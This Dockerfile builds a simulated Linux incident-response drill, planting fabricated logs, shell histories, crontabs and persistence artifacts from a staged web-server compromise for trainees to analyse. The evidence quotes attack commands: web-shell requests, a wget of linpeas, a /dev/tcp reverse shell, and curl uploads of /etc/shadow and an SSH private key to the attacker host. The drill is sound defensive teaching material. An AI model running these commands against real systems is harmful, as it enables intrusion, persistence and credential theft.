FROM ubuntu:22.04

LABEL maintainer="digital4security"
LABEL description="Intermediate Drill 02 - Linux Incident Response (simulated evidence)"

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y --no-install-recommends \
    bash \
    grep \
    gawk \
    sed \
    curl \
    jq \
    python3 \
    && rm -rf /var/lib/apt/lists/*

RUN mkdir -p /evidence/logs \
             /evidence/artifacts/crontabs \
             /evidence/scripts

# ── nginx access log ─────────────────────────────────────────────────────────
RUN cat > /evidence/logs/nginx_access.log << 'EOF'
203.0.113.88 - - [15/Jan/2024:03:41:12 +0000] "GET /index.php HTTP/1.1" 200 4523 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
203.0.113.88 - - [15/Jan/2024:03:41:44 +0000] "GET /admin/login.php HTTP/1.1" 200 1832 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
203.0.113.88 - - [15/Jan/2024:03:41:58 +0000] "POST /admin/login.php HTTP/1.1" 302 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
203.0.113.88 - - [15/Jan/2024:03:42:05 +0000] "GET /admin/dashboard.php HTTP/1.1" 200 8291 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
203.0.113.88 - - [15/Jan/2024:03:42:33 +0000] "GET /admin/upload.php HTTP/1.1" 200 2104 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
203.0.113.88 - - [15/Jan/2024:03:43:01 +0000] "POST /admin/upload.php HTTP/1.1" 200 128 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
203.0.113.88 - - [15/Jan/2024:03:43:22 +0000] "GET /uploads/images/shell.php?cmd=id HTTP/1.1" 200 47 "-" "curl/7.88.1"
203.0.113.88 - - [15/Jan/2024:03:43:31 +0000] "GET /uploads/images/shell.php?cmd=whoami HTTP/1.1" 200 43 "-" "curl/7.88.1"
203.0.113.88 - - [15/Jan/2024:03:43:45 +0000] "GET /uploads/images/shell.php?cmd=cat+/etc/passwd HTTP/1.1" 200 1832 "-" "curl/7.88.1"
203.0.113.88 - - [15/Jan/2024:03:44:02 +0000] "GET /uploads/images/shell.php?cmd=find+/+%2Dname+%22*.conf%22+2%3E/dev/null HTTP/1.1" 200 3012 "-" "curl/7.88.1"
203.0.113.88 - - [15/Jan/2024:03:44:30 +0000] "GET /uploads/images/shell.php?cmd=wget+-q+http%3A%2F%2F203.0.113.88%2Ftools%2Flinpeas.sh+-O+%2Ftmp%2F.cache%2Fcheck.sh HTTP/1.1" 200 29 "-" "curl/7.88.1"
203.0.113.88 - - [15/Jan/2024:03:45:10 +0000] "GET /uploads/images/shell.php?cmd=chmod+%2Bx+%2Ftmp%2F.cache%2Fcheck.sh+%26%26+%2Ftmp%2F.cache%2Fcheck.sh+2%3E%261+%7C+tee+%2Ftmp%2F.cache%2Fcheck.out HTTP/1.1" 200 29 "-" "curl/7.88.1"
10.10.10.1 - - [15/Jan/2024:03:46:00 +0000] "GET /index.php HTTP/1.1" 200 4523 "-" "curl/7.88.1"
203.0.113.88 - - [15/Jan/2024:03:46:18 +0000] "GET /uploads/images/shell.php?cmd=cat+%2Ftmp%2F.cache%2Fcheck.out+%7C+grep+%22SUID%22 HTTP/1.1" 200 512 "-" "curl/7.88.1"
203.0.113.88 - - [15/Jan/2024:03:46:45 +0000] "GET /uploads/images/shell.php?cmd=cat+%2Fvar%2Fspool%2Fcron%2Fcrontabs%2Froot HTTP/1.1" 200 198 "-" "curl/7.88.1"
203.0.113.88 - - [15/Jan/2024:03:47:05 +0000] "GET /uploads/images/shell.php?cmd=echo+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F203.0.113.88%2F4444+0%3E%261%22+%3E+%2Fopt%2Fmonitoring%2Fhealth_check.sh HTTP/1.1" 200 29 "-" "curl/7.88.1"
EOF

# ── nginx error log ───────────────────────────────────────────────────────────
RUN cat > /evidence/logs/nginx_error.log << 'EOF'
2024/01/15 03:43:01 [warn] 1234#1234: *892 a client request body is buffered to a temporary file /var/cache/nginx/client_temp/0000000001, client: 203.0.113.88, server: novatech-web, request: "POST /admin/upload.php HTTP/1.1", host: "web-prod-03"
2024/01/15 03:43:22 [error] 1234#1234: *912 FastCGI sent in stderr: "PHP message: PHP Warning: shell_exec() has been disabled" while reading response header from upstream, client: 203.0.113.88, server: novatech-web, request: "GET /uploads/images/shell.php?cmd=id"
EOF

# ── auth.log ─────────────────────────────────────────────────────────────────
RUN cat > /evidence/logs/auth.log << 'EOF'
Jan 15 03:50:14 web-prod-03 sshd[8821]: Connection from 203.0.113.88 port 54321
Jan 15 03:50:14 web-prod-03 sshd[8821]: Accepted publickey for deploy from 203.0.113.88 port 54321 ssh2: RSA SHA256:xK9mN2pQrT4vW6yB8zA1cE3fH5jL7nP0sU2wX4yA6bC
Jan 15 03:50:14 web-prod-03 sshd[8821]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
Jan 15 03:51:02 web-prod-03 sudo[8834]: deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
Jan 15 03:51:22 web-prod-03 sudo[8838]: deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
Jan 15 03:59:44 web-prod-03 sshd[8821]: Disconnected from 203.0.113.88 port 54321
Jan 15 04:02:10 web-prod-03 sshd[9012]: Connection from 203.0.113.88 port 54400
Jan 15 04:02:10 web-prod-03 sshd[9012]: Accepted publickey for root from 203.0.113.88 port 54400 ssh2: RSA SHA256:aB1cD2eF3gH4iJ5kL6mN7oP8qR9sT0uV1wX2yZ3aB4c
Jan 15 04:02:10 web-prod-03 sshd[9012]: pam_unix(sshd:session): session opened for user root by (uid=0)
Jan 15 04:05:33 web-prod-03 sshd[9012]: Disconnected from 203.0.113.88 port 54400
EOF

# ── syslog ────────────────────────────────────────────────────────────────────
RUN cat > /evidence/logs/syslog << 'EOF'
Jan 15 03:47:06 web-prod-03 cron[1201]: (root) CMD (/opt/monitoring/health_check.sh)
Jan 15 03:47:06 web-prod-03 kernel: [12345.678] connection tracking: accepting new connection
Jan 15 03:47:10 web-prod-03 cron[1201]: (root) CMD (/opt/monitoring/health_check.sh)
Jan 15 03:52:00 web-prod-03 cron[1201]: (root) CMD (/tmp/.cache/update.sh)
Jan 15 03:52:00 web-prod-03 cron[1209]: (www-data) CMD (/tmp/.cache/update.sh)
Jan 15 03:55:00 web-prod-03 cron[1301]: (root) CMD (/tmp/.cache/update.sh)
Jan 15 03:58:00 web-prod-03 cron[1401]: (root) CMD (/tmp/.cache/update.sh)
Jan 15 04:01:00 web-prod-03 cron[1501]: (root) CMD (/tmp/.cache/update.sh)
EOF

# ── auditd log ────────────────────────────────────────────────────────────────
RUN cat > /evidence/logs/audit.log << 'EOF'
type=SYSCALL msg=audit(1705283003.001:1001): arch=c000003e syscall=59 success=yes exit=0 a0=7f pid=9801 ppid=9800 uid=33 gid=33 euid=33 exe="/bin/bash" key="exec_www"
type=EXECVE msg=audit(1705283003.001:1001): argc=3 a0="bash" a1="-c" a2="id"
type=SYSCALL msg=audit(1705283010.002:1002): arch=c000003e syscall=59 success=yes exit=0 a0=7f pid=9810 ppid=9801 uid=33 gid=33 euid=33 exe="/bin/bash" key="exec_www"
type=EXECVE msg=audit(1705283010.002:1002): argc=3 a0="bash" a1="-c" a2="cat /etc/passwd"
type=SYSCALL msg=audit(1705283015.003:1003): arch=c000003e syscall=59 success=yes exit=0 a0=7f pid=9820 ppid=9801 uid=33 gid=33 euid=33 exe="/usr/bin/wget" key="exec_www"
type=EXECVE msg=audit(1705283015.003:1003): argc=5 a0="wget" a1="-q" a2="http://203.0.113.88/tools/linpeas.sh" a3="-O" a4="/tmp/.cache/check.sh"
type=SOCKADDR msg=audit(1705283015.003:1003): saddr=02001F90CB0071580000000000000000
type=SYSCALL msg=audit(1705283025.004:1004): arch=c000003e syscall=59 success=yes exit=0 a0=7f pid=9840 ppid=9801 uid=33 gid=33 euid=33 exe="/bin/cat" key="exec_www"
type=EXECVE msg=audit(1705283025.004:1004): argc=2 a0="cat" a1="/var/spool/cron/crontabs/root"
type=SYSCALL msg=audit(1705283031.005:1005): arch=c000003e syscall=59 success=yes exit=0 a0=7f pid=9850 ppid=9801 uid=33 gid=33 euid=33 exe="/bin/echo" key="exec_www"
type=EXECVE msg=audit(1705283031.005:1005): argc=3 a0="echo" a1="bash -i >& /dev/tcp/203.0.113.88/4444 0>&1" a2=">/opt/monitoring/health_check.sh"
type=SYSCALL msg=audit(1705283066.006:1006): arch=c000003e syscall=59 success=yes exit=0 a0=7f pid=1201 ppid=1200 uid=0 gid=0 euid=0 exe="/bin/bash" key="exec_root"
type=EXECVE msg=audit(1705283066.006:1006): argc=3 a0="bash" a1="-i" a2=">& /dev/tcp/203.0.113.88/4444 0>&1"
type=SYSCALL msg=audit(1705283120.007:1007): arch=c000003e syscall=59 success=yes exit=0 a0=7f pid=1210 ppid=1201 uid=0 gid=0 euid=0 exe="/bin/bash" key="exec_root"
type=EXECVE msg=audit(1705283120.007:1007): argc=2 a0="bash" a1="-c" a2="echo 'bash -i >& /dev/tcp/203.0.113.88/4444 0>&1' > /tmp/.cache/update.sh && chmod +x /tmp/.cache/update.sh"
type=SYSCALL msg=audit(1705283125.008:1008): arch=c000003e syscall=59 success=yes exit=0 a0=7f pid=1215 ppid=1201 uid=0 gid=0 euid=0 exe="/bin/bash" key="exec_root"
type=EXECVE msg=audit(1705283125.008:1008): argc=2 a0="bash" a1="-c" a2="(crontab -l 2>/dev/null; echo '*/3 * * * * /tmp/.cache/update.sh') | crontab -"
type=SYSCALL msg=audit(1705283130.009:1009): arch=c000003e syscall=59 success=yes exit=0 a0=7f pid=1220 ppid=1201 uid=0 gid=0 euid=0 exe="/bin/bash" key="exec_root"
type=EXECVE msg=audit(1705283130.009:1009): argc=2 a0="bash" a1="-c" a2="mkdir -p /root/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7kali@attack-box' >> /root/.ssh/authorized_keys"
type=SYSCALL msg=audit(1705283135.010:1010): arch=c000003e syscall=59 success=yes exit=0 a0=7f pid=1225 ppid=1201 uid=0 gid=0 euid=0 exe="/bin/bash" key="exec_root"
type=EXECVE msg=audit(1705283135.010:1010): argc=2 a0="bash" a1="-c" a2="cat /etc/shadow > /tmp/.cache/shadow_bak && curl -s -F 'file=@/tmp/.cache/shadow_bak' http://203.0.113.88/upload"
type=SYSCALL msg=audit(1705283140.011:1011): arch=c000003e syscall=59 success=yes exit=0 a0=7f pid=1230 ppid=1201 uid=0 gid=0 euid=0 exe="/bin/bash" key="exec_root"
type=EXECVE msg=audit(1705283140.011:1011): argc=2 a0="bash" a1="-c" a2="cat /home/deploy/.ssh/id_rsa > /tmp/.cache/deploy_key && curl -s -F 'file=@/tmp/.cache/deploy_key' http://203.0.113.88/upload"
EOF

# ── www-data bash history ─────────────────────────────────────────────────────
RUN cat > /evidence/artifacts/www-data_history << 'EOF'
id
whoami
cat /etc/passwd
cat /etc/shadow
uname -a
cat /proc/version
ps aux
ss -tnp
find / -perm -4000 -type f 2>/dev/null
cat /var/spool/cron/crontabs/root
ls -la /opt/monitoring/
ls -la /tmp/
mkdir -p /tmp/.cache
wget -q http://203.0.113.88/tools/linpeas.sh -O /tmp/.cache/check.sh
chmod +x /tmp/.cache/check.sh
/tmp/.cache/check.sh 2>&1 | tee /tmp/.cache/check.out
cat /tmp/.cache/check.out | grep -E "SUID|writable|cron"
echo "bash -i >& /dev/tcp/203.0.113.88/4444 0>&1" > /opt/monitoring/health_check.sh
EOF

# ── deploy bash history ───────────────────────────────────────────────────────
RUN cat > /evidence/artifacts/deploy_history << 'EOF'
sudo systemctl status nginx
sudo systemctl restart nginx
ls -la /var/www/html/uploads/images/
ls -la /tmp/.cache/
cat /tmp/.cache/update.sh
sudo su -
EOF

# ── process snapshot ──────────────────────────────────────────────────────────
RUN cat > /evidence/artifacts/proc_snapshot.txt << 'EOF'
USER       PID  PPID  CMD
root         1     0  /sbin/init
root      1200  1199  /usr/sbin/cron
root      1201  1200  bash -i >& /dev/tcp/203.0.113.88/4444 0>&1
www-data  9800  9799  nginx: worker process
www-data  9801  9800  bash -c echo "bash -i >& /dev/tcp/..." > /opt/monitoring/health_check.sh
EOF

# ── lastlog / wtmp ─────────────────────────────────────────────────────────────
RUN cat > /evidence/artifacts/lastlog.txt << 'EOF'
Username         Port     From              Latest
root             pts/1    203.0.113.88      Mon Jan 15 04:02:10 +0000 2024
deploy           pts/0    203.0.113.88      Mon Jan 15 03:50:14 +0000 2024
www-data         Never logged in
EOF

# ── crontabs ──────────────────────────────────────────────────────────────────
RUN cat > /evidence/artifacts/crontabs/root_crontab << 'EOF'
# Original legitimate cron jobs
*/5 * * * * /opt/monitoring/health_check.sh
0 2 * * * /usr/bin/logrotate /etc/logrotate.conf

# ADDED BY ATTACKER:
*/3 * * * * /tmp/.cache/update.sh
EOF

RUN cat > /evidence/artifacts/crontabs/www-data_crontab << 'EOF'
# Added by attacker via web shell
*/3 * * * * /tmp/.cache/update.sh
EOF

RUN cat > /evidence/artifacts/crontabs/system_crontabs << 'EOF'
# /etc/cron.d/monitoring
*/5 * * * * root /opt/monitoring/health_check.sh
EOF

# ── sudoers export ────────────────────────────────────────────────────────────
RUN cat > /evidence/artifacts/sudoers_export << 'EOF'
# /etc/sudoers
root    ALL=(ALL:ALL) ALL
deploy  ALL=(ALL) /usr/bin/systemctl
%sudo   ALL=(ALL:ALL) ALL
www-data ALL=(ALL) NOPASSWD: /usr/bin/tee /opt/monitoring/*
EOF

# ── authorized keys ───────────────────────────────────────────────────────────
RUN cat > /evidence/artifacts/root_authorized_keys << 'EOF'
# Added by attacker at 03:48 UTC
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7kali@attack-box
EOF

RUN cat > /evidence/artifacts/deploy_authorized_keys << 'EOF'
# Original deploy key (legitimate)
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC9deploy-ci@novatech.internal
# Backdoor key added by attacker
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7kali@attack-box
EOF

# ── systemd units ─────────────────────────────────────────────────────────────
RUN cat > /evidence/artifacts/systemd_units.txt << 'EOF'
# /etc/systemd/system/system-update.service  (ATTACKER-CREATED)
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/tmp/.cache/update.sh
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

# ── rc.local ──────────────────────────────────────────────────────────────────
RUN cat > /evidence/artifacts/rc_local << 'EOF'
#!/bin/sh -e
# rc.local
# Appended by attacker:
/tmp/.cache/update.sh &
exit 0
EOF

# ── filesystem timeline ───────────────────────────────────────────────────────
RUN cat > /evidence/artifacts/fs_timeline.csv << 'EOF'
Timestamp,Event,Path,Mode,Owner,Note
2024-01-15T03:43:01,CREATE,/var/www/html/uploads/images/shell.php,-rw-r--r--,www-data,web shell uploaded
2024-01-15T03:44:30,CREATE,/tmp/.cache/check.sh,-rwxr-xr-x,www-data,linpeas download
2024-01-15T03:45:10,CREATE,/tmp/.cache/check.out,-rw-r--r--,www-data,linpeas output
2024-01-15T03:47:05,MODIFY,/opt/monitoring/health_check.sh,-rwxr-xr-x,www-data,WORLD-WRITABLE overwritten by www-data
2024-01-15T03:48:00,CREATE,/tmp/.cache/update.sh,-rwxr-xr-x,root,reverse shell cron payload
2024-01-15T03:48:05,MODIFY,/var/spool/cron/crontabs/root,-rw-------,root,new cron entry added
2024-01-15T03:48:10,MODIFY,/root/.ssh/authorized_keys,-rw-------,root,attacker SSH key added
2024-01-15T03:48:12,CREATE,/tmp/.cache/shadow_bak,-rw-r--r--,root,/etc/shadow copy
2024-01-15T03:48:15,CREATE,/tmp/.cache/deploy_key,-rw-r--r--,root,deploy SSH private key copy
2024-01-15T03:48:20,CREATE,/etc/systemd/system/system-update.service,-rw-r--r--,root,attacker systemd service
2024-01-15T03:48:25,MODIFY,/etc/rc.local,-rwxr-xr-x,root,attacker persistence appended
2024-01-15T03:48:30,MODIFY,/home/deploy/.ssh/authorized_keys,-rw-------,deploy,attacker key added to deploy
writable,WORLD-WRITABLE,/opt/monitoring/health_check.sh,-rwxrwxrwx,root,CRITICAL: world-writable root cron script
EOF

# ── network snapshot ──────────────────────────────────────────────────────────
RUN cat > /evidence/artifacts/ss_output.txt << 'EOF'
Netid  State   Recv-Q  Send-Q  Local Address:Port   Peer Address:Port  Process
tcp    ESTAB   0       0       10.0.0.30:47201       203.0.113.88:4444  users:(("bash",pid=1201,fd=1))
tcp    LISTEN  0       128     0.0.0.0:80             0.0.0.0:*         users:(("nginx",pid=9799))
tcp    LISTEN  0       128     0.0.0.0:22             0.0.0.0:*         users:(("sshd",pid=1100))
EOF

# ── passwd and shadow copies ──────────────────────────────────────────────────
RUN cat > /evidence/artifacts/passwd_copy << 'EOF'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
deploy:x:1001:1001:Deploy User:/home/deploy:/bin/bash
EOF

RUN cat > /evidence/artifacts/shadow_copy << 'EOF'
root:$6$rounds=656000$XxXxXxXxXxXxXxXx$hash_value_here:19737:0:99999:7:::
www-data:!:19737:0:99999:7:::
deploy:$6$rounds=656000$YyYyYyYyYyYyYyYy$hash_value_here:19737:0:99999:7:::
EOF

# ── timeline build script ─────────────────────────────────────────────────────
RUN cat > /evidence/scripts/build-timeline.sh << 'SCRIPT'
#!/bin/bash
echo "=== Attack Timeline: web-prod-03 Incident 2024-01-15 ==="
echo ""
echo "Correlating logs from 03:40 - 04:10 UTC..."
echo ""

grep -h "03:4\|03:5\|04:0" \
    /evidence/logs/auth.log \
    /evidence/logs/syslog \
    2>/dev/null | sort | while read line; do
    echo "$line"
done

echo ""
echo "--- Filesystem Timeline ---"
cat /evidence/artifacts/fs_timeline.csv | column -t -s ','
SCRIPT
RUN chmod +x /evidence/scripts/build-timeline.sh

CMD ["/bin/bash"]
